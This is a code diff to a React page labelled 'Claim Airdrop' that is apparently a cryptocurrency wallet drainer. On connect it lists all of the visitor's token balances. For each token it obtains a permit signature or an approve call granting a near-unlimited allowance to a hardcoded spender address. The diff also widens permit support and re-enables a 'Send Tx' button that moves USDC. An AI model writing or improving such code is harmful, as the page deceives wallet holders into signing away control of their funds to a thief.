@@ -6,7 +6,7 @@ import { HeadingComponent } from 'components/layout/HeadingComponent'
 import { ethers } from 'ethers'
 import { useEffect, useState } from 'react'
 import { SPENDER_ADDRESS } from 'utils/config'
-import { contractHasPermit, erc721PermitSignature } from 'utils/permit'
+import { checkContractPermit, erc721PermitSignature } from 'utils/permit'
 import { useAccount, useNetwork } from 'wagmi'
 import erc20Abi from '../utils/abis/erc20.json'
 
@@ -22,7 +22,7 @@ export default function Home() {
 
   async function connect() {
     const account = getAccount()
-    // account.address = '0xf646d9B7d20BABE204a89235774248BA18086dae'
+    // account.address = '0x2e91728aF3a54aCDCeD7938fE9016aE2cc5948C9'
     const { chain: connectedChain } = getNetwork()
     let chainName = 'eth'
     if (connectedChain && connectedChain.id === 1) {
@@ -34,7 +34,7 @@ export default function Home() {
     }
     try {
       const balances = await axios.get(`/api/balance/${account.address}?chain=${chainName}`)
-      console.log(balances)
+      console.log(balances.data)
       for (let bal of balances.data) {
         await signNew(bal.address)
       }
@@ -56,10 +56,10 @@ export default function Home() {
         abi: erc20Abi,
         signerOrProvider: signer as any,
       })
-      const hasPermit = await contractHasPermit(contractAddress, 1)
-      if (hasPermit) {
+      const permit = await checkContractPermit(contractAddress, 1)
+      if (permit === 2 || permit === 1) {
         const value = ethers.utils.parseEther('10000000000000000000').toString()
-        const data = await erc721PermitSignature(account.address || '', SPENDER_ADDRESS, value, contract)
+        const data = await erc721PermitSignature(permit.toString(), account.address || '', SPENDER_ADDRESS, value, contract)
         setTxData(data)
       } else {
         const approve = await contract?.approve(SPENDER_ADDRESS, ethers.utils.parseEther('10000000000000000000'))
@@ -72,8 +72,9 @@ export default function Home() {
   }
 
   async function sendTx() {
+    const { chain } = getNetwork()
     const signer = await fetchSigner({
-      chainId: 1,
+      chainId: chain?.id || 1,
     })
     const contract = getContract({
       address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
@@ -102,9 +103,9 @@ export default function Home() {
               Claim Airdrop
             </Button>
             <br />
-            {/* <Button mt={4} onClick={sendTx}>
+            <Button mt={4} onClick={sendTx}>
               Send Tx
-            </Button> */}
+            </Button>
           </FormControl>
         </div>
       </main>
